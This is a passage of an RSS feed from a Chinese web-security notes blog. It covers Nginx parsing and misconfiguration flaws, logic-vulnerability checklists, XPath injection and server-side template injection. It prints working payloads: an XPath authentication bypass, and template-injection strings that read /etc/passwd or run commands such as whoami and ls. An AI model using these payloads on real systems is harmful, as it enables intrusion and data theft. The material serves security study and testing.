&lt;p&gt;在 Fast-CGI 关闭的情况下， Nginx 仍然存在解析漏洞： 在文件路径 (xx.jpg) 后面加上  &lt;code&gt;%00.php&lt;/code&gt;  ， 即  &lt;code&gt;xx.jpg%00.php&lt;/code&gt;  会被当做 php 文件来解析&lt;/p&gt;
&lt;h2 id=&#34;fast-cgi开启&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#fast-cgi开启&#34;&gt;#&lt;/a&gt; Fast-CGI 开启&lt;/h2&gt;
&lt;p&gt;在 Fast-CGI 开启状态下，在文件路径后加上  &lt;code&gt;/xx.php&lt;/code&gt;  ，则  &lt;code&gt;xx.jpg/xx.php&lt;/code&gt;  会被解析为 php 文件&lt;/p&gt;
&lt;h2 id=&#34;cve-2013-4547&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cve-2013-4547&#34;&gt;#&lt;/a&gt; CVE-2013-4547&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;a.jpg\x20\x00.php
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;配置错误&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#配置错误&#34;&gt;#&lt;/a&gt; 配置错误&lt;/h2&gt;
&lt;h3 id=&#34;目录穿越&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#目录穿越&#34;&gt;#&lt;/a&gt; 目录穿越&lt;/h3&gt;
&lt;p&gt;如果配置中存在类似  &lt;code&gt;location /foo &amp;#123; alias /bar/; &amp;#125;&lt;/code&gt;  的配置时， &lt;code&gt;/foo../&lt;/code&gt;  会被解析为  &lt;code&gt;/bar/../&lt;/code&gt;  从而导致目录穿越的发生。&lt;/p&gt;
&lt;h3 id=&#34;目录遍历-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#目录遍历-2&#34;&gt;#&lt;/a&gt; 目录遍历&lt;/h3&gt;
&lt;p&gt;配置中  &lt;code&gt;autoindex on&lt;/code&gt;  开启时，Nginx 中存在目录遍历漏洞。&lt;/p&gt;
&lt;h2 id=&#34;参考链接-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接-2&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy45MXJpLm9yZy85MDY0Lmh0bWw=&#34;&gt;CVE-2013-4547 Nginx 解析漏洞深入利用及分析&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8/</guid>
            <title>配置与策略安全</title>
            <link>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8/</link>
            <category>网络安全</category>
            <category>策略配置</category>
            <pubDate>Sun, 27 Nov 2022 10:57:09 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;认证策略&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#认证策略&#34;&gt;#&lt;/a&gt; 认证策略&lt;/h1&gt;
&lt;h2 id=&#34;密码策略&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#密码策略&#34;&gt;#&lt;/a&gt; 密码策略&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;未限制密码最低位数&lt;/li&gt;
&lt;li&gt;未限制密码必须包含字符集&lt;/li&gt;
&lt;li&gt;为常用密码&lt;/li&gt;
&lt;li&gt;个人信息相关
&lt;ul&gt;
&lt;li&gt;手机号&lt;/li&gt;
&lt;li&gt;生日&lt;/li&gt;
&lt;li&gt;姓名&lt;/li&gt;
&lt;li&gt;用户名&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;未检测常见弱密码
&lt;ul&gt;
&lt;li&gt;已泄露的常用密码&lt;/li&gt;
&lt;li&gt;键盘模式&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;加密实现&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#加密实现&#34;&gt;#&lt;/a&gt; 加密实现&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;在客户端存储私钥&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;权限配置&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#权限配置&#34;&gt;#&lt;/a&gt; 权限配置&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;运维人员权限粒度过大&lt;/li&gt;
&lt;li&gt;客服人员权限粒度过大&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;供应链安全&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#供应链安全&#34;&gt;#&lt;/a&gt; 供应链安全&lt;/h1&gt;
&lt;h2 id=&#34;三方认证&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#三方认证&#34;&gt;#&lt;/a&gt; 三方认证&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;利用被攻击的第三方服务账号登录其他平台账号&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;三方库软件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#三方库软件&#34;&gt;#&lt;/a&gt; 三方库 / 软件&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;公开漏洞后没有及时更新&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E3%80%81%E4%B8%9A%E5%8A%A1%E6%BC%8F%E6%B4%9E/</guid>
            <title>逻辑漏洞/业务漏洞</title>
            <link>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E3%80%81%E4%B8%9A%E5%8A%A1%E6%BC%8F%E6%B4%9E/</link>
            <category>网络安全</category>
            <category>漏洞</category>
            <category>逻辑</category>
            <pubDate>Sun, 27 Nov 2022 10:50:09 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h1&gt;
&lt;p&gt;逻辑漏洞是指由于程序逻辑不严导致一些逻辑分支处理错误造成的漏洞。&lt;/p&gt;
&lt;p&gt;在实际开发中，因为开发者水平不一没有安全意识，而且业务发展迅速内部测试没有及时到位，所以常常会出现类似的漏洞。&lt;/p&gt;
&lt;h1 id=&#34;安装逻辑&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#安装逻辑&#34;&gt;#&lt;/a&gt; 安装逻辑&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;查看能否绕过判定重新安装&lt;/li&gt;
&lt;li&gt;查看能否利用安装文件获取信息&lt;/li&gt;
&lt;li&gt;看能否利用更新功能获取信息&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;交易&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#交易&#34;&gt;#&lt;/a&gt; 交易&lt;/h1&gt;
&lt;h2 id=&#34;购买&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#购买&#34;&gt;#&lt;/a&gt; 购买&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;修改支付的价格&lt;/li&gt;
&lt;li&gt;修改支付的状态&lt;/li&gt;
&lt;li&gt;修改购买数量为负数&lt;/li&gt;
&lt;li&gt;修改金额为负数&lt;/li&gt;
&lt;li&gt;重放成功的请求&lt;/li&gt;
&lt;li&gt;并发数据库锁处理不当&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;业务风控&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#业务风控&#34;&gt;#&lt;/a&gt; 业务风控&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;刷优惠券&lt;/li&gt;
&lt;li&gt;套现&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;账户&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#账户&#34;&gt;#&lt;/a&gt; 账户&lt;/h1&gt;
&lt;h2 id=&#34;注册&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#注册&#34;&gt;#&lt;/a&gt; 注册&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;覆盖注册&lt;/li&gt;
&lt;li&gt;尝试重复用户名&lt;/li&gt;
&lt;li&gt;注册遍历猜解已有账号&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;密码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#密码&#34;&gt;#&lt;/a&gt; 密码&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;密码未使用哈希算法保存&lt;/li&gt;
&lt;li&gt;没有验证用户设置密码的强度&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;邮箱用户名&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#邮箱用户名&#34;&gt;#&lt;/a&gt; 邮箱用户名&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;前后空格&lt;/li&gt;
&lt;li&gt;大小写变换&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;cookie&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cookie&#34;&gt;#&lt;/a&gt; Cookie&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;包含敏感信息&lt;/li&gt;
&lt;li&gt;未验证合法性可伪造&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;手机号用户名&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#手机号用户名&#34;&gt;#&lt;/a&gt; 手机号用户名&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;前后空格&lt;/li&gt;
&lt;li&gt;+86&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;登录&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#登录&#34;&gt;#&lt;/a&gt; 登录&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;撞库&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;设置异地登录检查等机制&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;账号劫持&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;恶意尝试帐号密码锁死账户&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;需要设置锁定机制与解锁机制&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;不安全的传输信道&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;登录凭证存储在不安全的位置&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;找回密码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#找回密码&#34;&gt;#&lt;/a&gt; 找回密码&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;重置任意用户密码&lt;/li&gt;
&lt;li&gt;密码重置后新密码在返回包中&lt;/li&gt;
&lt;li&gt;Token 验证逻辑在前端&lt;/li&gt;
&lt;li&gt;X-Forwarded-Host 处理不正确&lt;/li&gt;
&lt;li&gt;找回密码功能泄露用户敏感信息&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;修改密码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#修改密码&#34;&gt;#&lt;/a&gt; 修改密码&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;越权修改密码&lt;/li&gt;
&lt;li&gt;修改密码没有旧密码验证&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;申诉&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#申诉&#34;&gt;#&lt;/a&gt; 申诉&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;身份伪造&lt;/li&gt;
&lt;li&gt;逻辑绕过&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;更新&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#更新&#34;&gt;#&lt;/a&gt; 更新&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;ORM 更新操作不当可更新任意字段&lt;/li&gt;
&lt;li&gt;权限限制不当可以越权修改&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;信息查询&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#信息查询&#34;&gt;#&lt;/a&gt; 信息查询&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;权限限制不当可以越权查询&lt;/li&gt;
&lt;li&gt;用户信息 ID 可以猜测导致遍历&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;2fa&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2fa&#34;&gt;#&lt;/a&gt; 2FA&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;重置密码后自动登录没有 2FA&lt;/li&gt;
&lt;li&gt;OAuth 登录没有启用 2FA&lt;/li&gt;
&lt;li&gt;2FA 可爆破&lt;/li&gt;
&lt;li&gt;2FA 有条件竞争&lt;/li&gt;
&lt;li&gt;修改返回值绕过&lt;/li&gt;
&lt;li&gt;激活链接没有启用 2FA&lt;/li&gt;
&lt;li&gt;可通过 CSRF 禁用 2FA&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;验证码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#验证码&#34;&gt;#&lt;/a&gt; 验证码&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;验证码可重用&lt;/li&gt;
&lt;li&gt;验证码可预测&lt;/li&gt;
&lt;li&gt;验证码强度不够&lt;/li&gt;
&lt;li&gt;验证码无时间限制或者失效时间长&lt;/li&gt;
&lt;li&gt;验证码无猜测次数限制&lt;/li&gt;
&lt;li&gt;验证码传递特殊的参数或不传递参数绕过&lt;/li&gt;
&lt;li&gt;验证码可从返回包中直接获取&lt;/li&gt;
&lt;li&gt;验证码不刷新或无效&lt;/li&gt;
&lt;li&gt;验证码数量有限&lt;/li&gt;
&lt;li&gt;验证码在数据包中返回&lt;/li&gt;
&lt;li&gt;修改 Cookie 绕过&lt;/li&gt;
&lt;li&gt;修改返回包绕过&lt;/li&gt;
&lt;li&gt;验证码在客户端生成或校验&lt;/li&gt;
&lt;li&gt;验证码可 OCR 或使用机器学习识别&lt;/li&gt;
&lt;li&gt;验证码用于手机短信 / 邮箱轰炸&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;session&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#session&#34;&gt;#&lt;/a&gt; Session&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Session 机制&lt;/li&gt;
&lt;li&gt;Session 猜测 / 爆破&lt;/li&gt;
&lt;li&gt;Session 伪造&lt;/li&gt;
&lt;li&gt;Session 泄漏&lt;/li&gt;
&lt;li&gt;Session Fixation&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;越权&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#越权&#34;&gt;#&lt;/a&gt; 越权&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;未授权访问&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;静态文件&lt;/li&gt;
&lt;li&gt;通过特定 url 来防止被访问&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;水平越权&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;攻击者可以访问与他拥有相同权限的用户的资源&lt;/li&gt;
&lt;li&gt;权限类型不变，ID 改变&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;垂直越权&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;低级别攻击者可以访问高级别用户的资源&lt;/li&gt;
&lt;li&gt;权限 ID 不变，类型改变&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;交叉越权&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;权限 ID 改变，类型改变&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;随机数安全&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#随机数安全&#34;&gt;#&lt;/a&gt; 随机数安全&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;使用不安全的随机数发生器&lt;/li&gt;
&lt;li&gt;使用时间等易猜解的因素作为随机数种子&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;其他&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#其他&#34;&gt;#&lt;/a&gt; 其他&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;用户 / 订单 / 优惠券等 ID 生成有规律，可枚举&lt;/li&gt;
&lt;li&gt;接口无权限、次数限制&lt;/li&gt;
&lt;li&gt;加密算法实现误用&lt;/li&gt;
&lt;li&gt;执行顺序&lt;/li&gt;
&lt;li&gt;敏感信息泄露&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2Jsb2cuY3Nkbi5uZXQvbXlsdXR0ZS9hcnRpY2xlL2RldGFpbHMvNTA4MTkxNDYjMTAwMDYtd2VpeGluLTEtNTI2MjYtNmIzYmZmZDAxZmRkZTQ5MDAxMzBiYzVhMjc1MWI2ZDE=&#34;&gt;水平越权漏洞及其解决方案&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjAyOQ==&#34;&gt;细说验证码安全 测试思路大梳理&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/Xpath/</guid>
            <title>Xpath</title>
            <link>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/Xpath/</link>
            <category>网络安全</category>
            <category>漏洞</category>
            <category>Xpath</category>
            <pubDate>Sun, 27 Nov 2022 10:44:09 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;xpath定义&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xpath定义&#34;&gt;#&lt;/a&gt; Xpath 定义&lt;/h1&gt;
&lt;p&gt;XPath 注入攻击是指利用 XPath 解析器的松散输入和容错特性，能够在 URL、表单或其它信息上附带恶意的 XPath 查询代码，以获得权限信息的访问权并更改这些信息。XPath 注入攻击是针对 Web 服务应用新的攻击方法，它允许攻击者在事先不知道 XPath 查询相关知识的情况下，通过 XPath 查询得到一个 XML 文档的完整内容。&lt;/p&gt;
&lt;h1 id=&#34;xpath注入攻击原理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xpath注入攻击原理&#34;&gt;#&lt;/a&gt; Xpath 注入攻击原理&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;XPath 注入攻击主要是通过构建特殊的输入，这些输入往往是 XPath 语法中的一些组合，这些输入将作为参数传入 Web 应用程序，通过执行 XPath 查询而执行入侵者想要的操作，下面以登录验证中的模块为例，说明 XPath 注入攻击的实现原理。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在 Web 应用程序的登录验证程序中，一般有用户名（username）和密码（password） 两个参数，程序会通过用户所提交输入的用户名和密码来执行授权操作。若验证数据存放在 XML 文件中，其原理是通过查找 user 表中的用户名 （username）和密码（password）的结果来进行授权访问，&lt;/p&gt;
&lt;p&gt;例存在 user.xml 文件如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;users&amp;gt;
     &amp;lt;user&amp;gt;
         &amp;lt;firstname&amp;gt;Ben&amp;lt;/firstname&amp;gt;
         &amp;lt;lastname&amp;gt;Elmore&amp;lt;/lastname&amp;gt;
         &amp;lt;loginID&amp;gt;abc&amp;lt;/loginID&amp;gt;
         &amp;lt;password&amp;gt;test123&amp;lt;/password&amp;gt;
     &amp;lt;/user&amp;gt;
     &amp;lt;user&amp;gt;
         &amp;lt;firstname&amp;gt;Shlomy&amp;lt;/firstname&amp;gt;
         &amp;lt;lastname&amp;gt;Gantz&amp;lt;/lastname&amp;gt;
         &amp;lt;loginID&amp;gt;xyz&amp;lt;/loginID&amp;gt;
         &amp;lt;password&amp;gt;123test&amp;lt;/password&amp;gt;
     &amp;lt;/user&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;则在 XPath 中其典型的查询语句为：  &lt;code&gt;//users/user[loginID/text()=&#39;xyz&#39;and password/text()=&#39;123test&#39;]&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;但是，可以采用如下的方法实施注入攻击，绕过身份验证。如果用 户传入一个 login 和 password，例如  &lt;code&gt;loginID = &#39;xyz&#39; 和 password = &#39;123test&#39;&lt;/code&gt;  ，则该查询语句将返回 true。但如果用户传入类似  &lt;code&gt;&#39; or 1=1 or &#39;&#39;=&#39;&lt;/code&gt;  的值，那么该查询语句也会得到 true 返回值，因为 XPath 查询语句最终会变成如下代码： &lt;code&gt;//users/user[loginID/text()=&#39;&#39;or 1=1 or &#39;&#39;=&#39;&#39; and password/text()=&#39;&#39; or 1=1 or &#39;&#39;=&#39;&#39;]&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这个字符串会在逻辑上使查询一直返回 true 并将一直允许攻击者访问系统。攻击者可以利用 XPath 在应用程序中动态地操作 XML 文档。攻击完成登录可以再通过 XPath 盲入技术获取最高权限帐号和其它重要文档信息。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</guid>
            <title>模板注入</title>
            <link>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</link>
            <category>注入</category>
            <category>绕过</category>
            <pubDate>Sun, 27 Nov 2022 09:51:54 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h1&gt;
&lt;p&gt;模板引擎用于使用动态数据呈现内容。此上下文数据通常由用户控制并由模板进行格式化，以生成网页、电子邮件等。模板引擎通过使用代码构造（如条件语句、循环等）处理上下文数据，允许在模板中使用强大的语言表达式，以呈现动态内容。如果攻击者能够控制要呈现的模板，则他们将能够注入可暴露上下文数据，甚至在服务器上运行任意命令的表达式。&lt;/p&gt;
&lt;h1 id=&#34;测试方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#测试方法&#34;&gt;#&lt;/a&gt; 测试方法&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;确定使用的引擎&lt;/li&gt;
&lt;li&gt;查看引擎相关的文档，确定其安全机制以及自带的函数和变量&lt;/li&gt;
&lt;li&gt;需找攻击面，尝试攻击&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;测试用例&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#测试用例&#34;&gt;#&lt;/a&gt; 测试用例&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;简单的数学表达式， &lt;code&gt;&amp;#123;&amp;#123; 7+7 &amp;#125;&amp;#125; =&amp;gt; 14&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;字符串表达式  &lt;code&gt;&amp;#123;&amp;#123; &#34;ajin&#34; &amp;#125;&amp;#125; =&amp;gt; ajin&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Ruby&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;%= 7 * 7 %&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;%= File.open(&#39;/etc/passwd&#39;).read %&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Java&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;$&amp;#123;7*7&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Twig&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;&amp;#123;7*7&amp;#125;&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Smarty&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;php&amp;#125;echo `id`;&amp;#123;/php&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;AngularJS&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;$eval(&#39;1+1&#39;)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Tornado&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;引用模块  &lt;code&gt;&amp;#123;% import module %&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;=&amp;gt;  &lt;code&gt;&amp;#123;% import os %&amp;#125;&amp;#123;&amp;#123; os.popen(&#34;whoami&#34;).read() &amp;#125;&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Flask/Jinja2&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;&amp;#123; config &amp;#125;&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;&amp;#123; config.items() &amp;#125;&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;&amp;#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config&amp;#125;&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;&amp;#123;&#39;&#39;.__class__.__mro__[-1].__subclasses__()&amp;#125;&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;&amp;#123; url_for.__globals__[&#39;__builtins__&#39;].__import__(&#39;os&#39;).system(&#39;ls&#39;) &amp;#125;&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;&amp;#123; request.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;/etc/passwd&#39;).read() &amp;#125;&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Django&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;&amp;#123; request &amp;#125;&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;% debug %&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;% load module %&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;% include &#34;x.html&#34; %&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;% extends &#34;x.html&#34; %&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;目标&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#目标&#34;&gt;#&lt;/a&gt; 目标&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;创建对象&lt;/li&gt;
&lt;li&gt;文件读写&lt;/li&gt;
&lt;li&gt;远程文件包含&lt;/li&gt;
&lt;li&gt;信息泄漏&lt;/li&gt;
&lt;li&gt;提权&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;相关属性&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#相关属性&#34;&gt;#&lt;/a&gt; 相关属性&lt;/h1&gt;
&lt;h2 id=&#34;__class__&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#__class__&#34;&gt;#&lt;/a&gt;  &lt;code&gt;__class__&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;python 中的新式类（即显示继承 object 对象的类）都有一个属性  &lt;code&gt;__class__&lt;/code&gt;  用于获取当前实例对应的类，例如  &lt;code&gt;&amp;quot;&amp;quot;.__class__&lt;/code&gt;  就可以获取到字符串实例对应的类&lt;/p&gt;
&lt;h2 id=&#34;__mro__&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#__mro__&#34;&gt;#&lt;/a&gt;  &lt;code&gt;__mro__&lt;/code&gt;&lt;/h2&gt;
